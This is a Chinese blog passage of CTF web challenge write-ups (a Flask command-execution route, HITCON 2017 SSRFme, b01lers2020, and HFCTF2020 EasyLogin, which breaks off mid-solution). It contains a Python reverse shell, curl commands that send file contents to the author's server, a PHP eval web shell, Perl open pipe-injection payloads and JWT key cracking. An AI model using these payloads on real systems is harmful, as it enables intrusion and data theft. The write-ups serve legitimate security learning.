class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs vim">from flask import Flask, Response<br>from flask import render_template<br>from flask import request<br>import os<br>import urllib<br><br>app = Flask(__name__)<br><br>SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br><span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(SECRET_FILE)<br>SECRET_KEY = <span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>().strip()<br>os.<span class="hljs-built_in">remove</span>(SECRET_FILE)<br><br><br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def <span class="hljs-built_in">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)<br><br><br>@app.route(<span class="hljs-string">&#x27;/page&#x27;</span>)<br>def page():<br>    url = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> not url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>            <span class="hljs-keyword">res</span> = urllib.urlopen(url)<br>            value = <span class="hljs-keyword">res</span>.<span class="hljs-keyword">read</span>()<br>            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)<br>            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">else</span>:<br>            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span><br>    except:<br>        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, <span class="hljs-keyword">res</span>=value)<br><br><br>@app.route(<span class="hljs-string">&#x27;/no_one_know_the_manager&#x27;</span>)<br>def manager():<br>    key = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-keyword">print</span>(SECRET_KEY)<br>    <span class="hljs-keyword">if</span> key == SECRET_KEY:<br>        <span class="hljs-keyword">shell</span> = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;shell&quot;</span>)<br>        os.<span class="hljs-built_in">system</span>(<span class="hljs-keyword">shell</span>)<br>        <span class="hljs-keyword">res</span> = <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">res</span> = <span class="hljs-string">&quot;Wrong Key!&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">res</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure>
<p>路由&#x2F;no_one_know_the_manager页面下接收key和shell参数，要求key &#x3D;&#x3D; SECRET_KEY<br>os.system(shell)可以执行我们的命令</p>
<p>先看这一段代码</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">SECRET_FILE <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br><span class="hljs-attribute">f</span> <span class="hljs-operator">=</span> open(SECRET_FILE)<br>SECRET_KEY <span class="hljs-operator">=</span> f.read().strip()<br>os.remove(SECRET_FILE)<br></code></pre></td></tr></table></figure>
<p>secret.txt访问不了</p>
<p>f&#x3D;open(SECRET_FILE)这句话说明这个文件是被open函数打开的，所以会创建文件描述符。程序读取完SECRET_KEY会删除&#x2F;tmp&#x2F;secret.txt，linux系统有个特性，<strong>如果一个程序打开了一个文件没有关闭</strong>，即便从外部(如os.remove(SECRET_FILE))删除之后，在&#x2F;proc这个进程的pid目录下的fd文件描述符目录下还是会有这个文件的fd，通过这个我们即可得到被删除文件的内容。<br>文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。</p>
<p>fd是一个目录，里面包含着当前进程打开的每一个文件的描述符（file descriptor）差不多就是路径啦，这些文件描述符是指向实际文件的一个符号连接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录的文件获取进程，从而打开每个文件的路径以及文件内容</p>
<p>查看指定进程打开的某个文件的内容。加上那个数字即可,用burp爆破最后的数字，看哪个数字的文件夹存在内容<br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000009724931">文件描述符（File Descriptor）简介</a><br>输入&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3<br><img src="/images/UBDKZ2UZQ98H7WA.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">8</span>YzXsu0k55QR1Oxm/j0xigou1NTWQOx8tQ4mxFhKBKo<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
<p>这就是密钥，有特殊字符，url编码一下。<br><img src="/images/FMJMOUPBXARCJ7GB650E.png" srcset="/img/loading.gif" lazyload><br>这里发现shell执行的命令并不会返回结果，所以使用反弹shell<br>这里我用的自己的aliyun服务器<br>先在安全组开放一个端口<br><img src="/images/GWSH3K5FDHHWTCTI.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">开启端口<br>firewall-cmd <span class="hljs-attr">--zone</span>=public <span class="hljs-attr">--add-port</span>=<span class="hljs-number">8888</span>/tcp <span class="hljs-attr">--permanent</span><br>重启防火墙<br>systemctl restart firewalld<span class="hljs-selector-class">.service</span><br>查看开启的端口<br>firewall-cmd <span class="hljs-attr">--list-ports</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/QG6BVR9XTF81J89D.png" srcset="/img/loading.gif" lazyload><br>输入命令 nc -lvvp 8888</p>
<p>这里使用python脚本反弹</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;1.1.1.1&quot;</span>,<span class="hljs-number">8888</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure>
<p>同样url加密下<br><img src="/images/SX5PKI9KIY.png" srcset="/img/loading.gif" lazyload></p>
<p>或是curl反弹shell<br>nc监听8888</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash">=curl ip:port/`<span class="hljs-built_in">ls</span> /|<span class="hljs-built_in">base64</span>`</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/A33B3JT3OVMOEL72J.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash">=curl ip:port/`<span class="hljs-built_in">cat</span> /flag|<span class="hljs-built_in">base64</span>`</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/SFP4AJ269VH8D8X5SR.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">?php<br>    <span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$http_x_headers</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>        <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$http_x_headers</span>[0];<br>    &#125;<br><br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&quot;sandbox/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<br>    @<span class="hljs-built_in">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    @<span class="hljs-built_in">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br><br>    <span class="hljs-variable">$data</span> = shell_exec(<span class="hljs-string">&quot;GET &quot;</span> . escapeshellarg(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]));<br>    <span class="hljs-variable">$info</span> = pathinfo(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>]);<br>    <span class="hljs-variable">$dir</span>  = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-built_in">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;dirname&quot;</span>]));<br>    @<span class="hljs-built_in">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>    @<span class="hljs-built_in">chdir</span>(<span class="hljs-variable">$dir</span>);<br>    @file_put_contents(<span class="hljs-built_in">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;basename&quot;</span>]), <span class="hljs-variable">$data</span>);<br>    highlight_file(__FILE__);<br></code></pre></td></tr></table></figure>
<p>第一个if是获取你的ip，这个用xff改为127.0.0.1，不改也行<br>$sandbox是把orange和IP连接在一起MD5加密<br><img src="/images/VJPS3YMLLASUSY6MBO.png" srcset="/img/loading.gif" lazyload><br>mkdir()创建文件<br>chdir()改变当前目录<br>shell_exec类似system命令执行<br>pathinfo()函数就是将传入的路径”字典化”<br>举个栗子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>]);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$info</span>);<br><br>输出-&gt;<br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123; [<span class="hljs-string">&quot;dirname&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">40</span>) <span class="hljs-string">&quot;/sanbox/cfbb870b58817bf7705c0bd826e8dba7&quot;</span> [<span class="hljs-string">&quot;basename&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;666.php&quot;</span> [<span class="hljs-string">&quot;extension&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;php&quot;</span> [<span class="hljs-string">&quot;filename&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;666&quot;</span> &#125;<br></code></pre></td></tr></table></figure>

<p>再理解一下shell_exec里的GET，这里的GET不是我们平常的GET方式传参，这里的GET是Lib for www in perl中的命令，目的是模拟http的GET请求，GET函数底层就是调用了open处理<br>这里用kali了解一下GET<br><img src="/images/69SL0LZ458DOQ0C26.png" srcset="/img/loading.gif" lazyload><br>这里GET一个根目录，功能类似于ls把它给列出来<br>可以读取文件<br><img src="/images/Q2DVTS7ZAI24RBZC.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>open漏洞</strong></p>
<p>在perl语言中，open函数存在命令执行漏洞;如果open文件名中存在管道符(也叫或符号|),就会将文件名直接以命令的形式执行，然后将命令的结果存到与命令同名的文件中。本题中调用了GET函数，而GET函数底层调用了open函数，故存在漏洞。</p>
<p>主要函数和漏洞了解完，就开始做题了<br>先看下根目录</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=/&amp;filename=<span class="hljs-number">666</span><br><br>然后进入<span class="hljs-regexp">/sandbox/</span>cfbb870b58817bf7705c0bd826e8dba7/<span class="hljs-number">666</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/CDFGGR2744GD6QNGH.png" srcset="/img/loading.gif" lazyload><br>根目录中存在flag和readflag<br>读一下</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=/flag&amp;filename=666<br>啥也没有<br>?<span class="hljs-attribute">url</span>=/readflag&amp;filename=666<br>下载了一个二进制文件<br></code></pre></td></tr></table></figure>
<p>应该是需要运行readflag来读flag的脚本，现在想方法执行它。<br>GET使用file协议的时候会调用perl中的open函数<br><img src="/images/EHD324EX9XRCHT6YO0.png" srcset="/img/loading.gif" lazyload><br>所以我们这题利用file绕过<br>本题有三种做法</p>
<h3 id="SSRF配合伪协议"><a href="#SSRF配合伪协议" class="headerlink" title="SSRF配合伪协议"></a>SSRF配合伪协议</h3><p>file_put_contents函数使用data伪协议控制其内容，这里通过GET后加data伪协议实现写马<br>写入的文件名称后缀可以是php，所以直接访问sandbox中的php文件，蚁剑连接。运行根目录的readflag<br>payload</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?url=data:text/plain,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;&amp;filename=test.php</span><br></code></pre></td></tr></table></figure>
<p>连接中国蚁剑<br>在根目录运行readflag<br><img src="/images/O8ZUNR5R2M2L1I.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="perl语言漏洞"><a href="#perl语言漏洞" class="headerlink" title="perl语言漏洞"></a>perl语言漏洞</h3><p>因为GET函数在底层调用了perl语言中的open函数，但是该函数存在rce漏洞。当open函数要打开的文件名中<strong>存在管道符</strong>（<strong>并且系统中存在该文件名</strong>），就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行。</p>
<p>所以先创建和readflag同名的文件</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=&amp;filename=|/readflag<br></code></pre></td></tr></table></figure>
<p><img src="/images/JZZERM2J78ERS9QG9Q.png" srcset="/img/loading.gif" lazyload><br>再执行命令</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=file:|/readflag&amp;filename=999<br></code></pre></td></tr></table></figure>
<p><img src="/images/F4N5QCOY6TEBOMH15.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="bash-c方法"><a href="#bash-c方法" class="headerlink" title="bash-c方法"></a>bash-c方法</h3><p>和上一个相同，bash -c就是将目标当作可执行文件运行</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=&amp;filename=|bash -c /readflag<br></code></pre></td></tr></table></figure>
<p><img src="/images/7536FPF2WU8C.png" srcset="/img/loading.gif" lazyload><br><img src="/images/T6RWWI6JASDNQS7U.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=file:|bash -c /readflag&amp;<span class="hljs-attribute">filename</span>=000<br></code></pre></td></tr></table></figure>
<p><img src="/images/YYR77XDQEDNPSO1.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>打开环境，发现图片会自动切换为新的页面&#x2F;die<br>&#x2F;die页面没什么信息<br>看原页面源代码找到js代码<br><img src="/images/NDWEM1T4FLQ93ZVC.png" srcset="/img/loading.gif" lazyload><br>第一个if捕获你的按键值，27为的ascii对应的为ESC，也就是按一下ESC进入if语句内<br>其实不按ESC也行它给了目录，直接进入即可。。。。<br>进入&#x2F;chase&#x2F;<br><img src="/images/JFY1CFTH10U4RT3G.png" srcset="/img/loading.gif" lazyload><br>进入&#x2F;leftt&#x2F;<br><img src="/images/0X73ARJRY0NS01HE.png" srcset="/img/loading.gif" lazyload><br>进入&#x2F;shoot&#x2F;<br><img src="/images/0HMJQQZDC5JFYX58.png" srcset="/img/loading.gif" lazyload><br>&#x2F;door&#x2F;<br>这么多门，哈人，找到js文件<br><img src="/images/9T04EWPWBYBB51NHZQR.png" srcset="/img/loading.gif" lazyload><br>&#x2F;open&#x2F;<br><img src="/images/FUN3KULN2J0LVNGIL.png" srcset="/img/loading.gif" lazyload><br>&#x2F;fight&#x2F;<br><img src="/images/CBULAAH1OEMDT.png" srcset="/img/loading.gif" lazyload><br>唯一有难点的地方，想了半天key值能是什么，然后一看这么点词随便就组个句子🤣<br>hey boys i am back！</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">pctf</span><span class="hljs-template-variable">&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br></code></pre></td></tr></table></figure>
<p>这里python能写一个脚本</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from itertools import permutations<br><br>flag = <span class="hljs-selector-attr">[<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>]</span><br><br>item = <span class="hljs-built_in">permutations</span>(flag)<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> item:  #通过 <span class="hljs-keyword">for</span> 循环迭代每个排列。<br>	k = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-selector-class">.join</span>(<span class="hljs-built_in">list</span>(i))<br>	<span class="hljs-keyword">if</span> k<span class="hljs-selector-class">.startswith</span>(<span class="hljs-string">&#x27;pctf&#123;hey_boys&#x27;</span>) and k<span class="hljs-selector-attr">[-1]</span> == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>		<span class="hljs-built_in">print</span>(k)<br><br></code></pre></td></tr></table></figure>

<p>先看permutations是什么<br><img src="/images/E2E1CYCYVSE6GNA.png" srcset="/img/loading.gif" lazyload><br>permutations函数返回的是可迭代元素中的一个排列组合（全排列）。</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">k</span> = <span class="hljs-string">&#x27;&#x27;</span>.join(list(i))<br></code></pre></td></tr></table></figure>
<p>将当前排列 i 转换为字符串，并将结果赋值给变量 k。这里使用了 join 方法来连接排列中的字符串。<br>join方法通过在内部优化实现，能够更有效地处理字符串连接，尤其是在循环中连接多个字符串时。它通过<strong>一次性</strong>连接所有元素，而不是多次创建新的中间字符串，从而提高性能。</p>
<p>当if条件不成立时，k的值不会在下一个循环中被保留。每次迭代开始时，都会重新计算k的值，因为它是在for循环中的赋值语句k &#x3D; ‘’.join(list(i))中生成的。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> k<span class="hljs-selector-class">.startswith</span>(<span class="hljs-string">&#x27;pctf&#123;hey_boys&#x27;</span>) and k<span class="hljs-selector-attr">[-1]</span> == <span class="hljs-string">&#x27;&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>检查字符串k是否以’pctf{hey_boys’ 开头且以 ‘}’ 结尾。<br><img src="/images/OPFHATSQHPARN6HEA.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>需要登录，也有注册功能<br>先不管它，看看源码<br>找到&#x2F;static&#x2F;js&#x2F;app.js文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  或许该用 koa-static 来处理静态文件</span><br><span class="hljs-comment"> *  路径该怎么配置？不管了先填个根目录XD</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">login</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> token = sessionStorage.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;token&quot;</span>);<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="hljs-attr">authorization</span>:token&#125;)<br>        .<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>            <span class="hljs-keyword">const</span> &#123;status&#125; = data;<br>            <span class="hljs-keyword">if</span>(status) &#123;<br>                <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/home&quot;</span>;<br>            &#125;<br>        &#125;)<br>        .<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>        &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">register</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)<br>        .<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>            <span class="hljs-keyword">const</span> &#123; token &#125; = data;<br>            sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>, token);<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/login&quot;</span>;<br>        &#125;)<br>        .<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>        &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/logout&#x27;</span>).<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>        <span class="hljs-keyword">const</span> &#123;status&#125; = data;<br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;/login&#x27;</span>;<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getflag</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/flag&#x27;</span>).<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>        <span class="hljs-keyword">const</span> &#123;flag&#125; = data;<br>        $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>(flag);<br>    &#125;).<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>看了下，是注册登录的功能，感觉没有获得flag的点</p>
<p>先注册登录，并抓包<br><img src="/images/BVCSTXL9GBODNC0XY2.png" srcset="/img/loading.gif" lazyload><br><img src="/images/BZWKPPG2BY1T9.png" srcset="/img/loading.gif" lazyload><br>base64解码一下<br><img src="/images/F7H1R7WV13ZKV.png" srcset="/img/loading.gif" lazyload><br>验证方式采用的是JWT<br>JWT有漏洞可以利用<br>这里放到官网看看<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a><br><img src="/images/FMORLAUSBGFWDEY0SKORX.png" srcset="/img/loading.gif" lazyload><br>感觉和[CISCN2019 华北赛区 Day1 Web2]ikun题差不多<br>用<a target="_blank" rel="noopener" href="https://gitcode.com/mirrors/brendan-rius/c-jwt-cracker/overview">c-jwt-cracker</a>爆个密钥<br><img src="/images/M52RMT3BXI95IKN1Y8.png" srcset="/img/loading.gif" lazyload><br>等了30分钟，嗯是爆不出来<br>又去查了查<br>报不出来应该是这个原因</p>
